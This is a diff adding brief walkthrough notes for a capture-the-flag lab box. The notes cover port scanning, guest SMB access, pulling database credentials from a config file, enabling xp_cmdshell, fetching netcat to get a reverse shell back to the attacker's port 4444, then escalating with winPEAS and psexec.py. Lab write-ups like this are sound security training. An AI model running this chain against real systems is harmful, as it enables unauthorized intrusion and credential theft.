@@ -1,0 +1,30 @@
+1. Scan open ports
+    sudo nmap -sS -open -n -Pn 10.129.25.142 -oG open-ports
+2. Scan version and possible vulnerabilities of that port
+    sudo nmap -p135,139,445,1433 -sVC -Pn 10.129.25.142 -oN version-ports
+3. SMB server is open » Let's check Share Lists
+    smbclient -L -N -I 10.129.25.142
+      -L » Show Lists
+      -N » Do connection with no password required
+      -I » Set target IP
+4. Connect to SMB client using a Share List
+    smbclient \\\\10.129.25.142\\backups -U guest
+      -U: user
+5. Get found file
+    smb: \> get prod.dtsConfig
+6. Extract pass info from obtained file
+    cat prod.dtsConfig | grep 'Password' | awk '{print $2}' FS=';' | awk 'NF{print $NF}' FS='='
+7. Extract user info
+    cat prod.dtsConfig | grep 'User' | awk '{print $3}' FS=';' | awk '{print $2}' | awk '{print $2}' FS='='
+8. Create a mssqlclient connection using auths finded
+    mssqlclient.py ARCHETYPE/sql_svc@10.129.25.142 -windows-auth -port 1433
+9. Let's get a Reversed shell (since we have admin privileges on SQL)
+    » Activate xp_cmdshell
+    » Get NetCat for windows
+        » Open http port in our machine with the file
+        » Get that file in victim machine
+    » Execute NetCat.exe -e cmd.exe and listen with nc in port 4444 of our machine
+10. Execute winPEAS using remote shell
+11. Get Administrator credentials
+12. Use psexec.py administrator@10.129.196.23 to run a remote cmd
+    » Find the flag
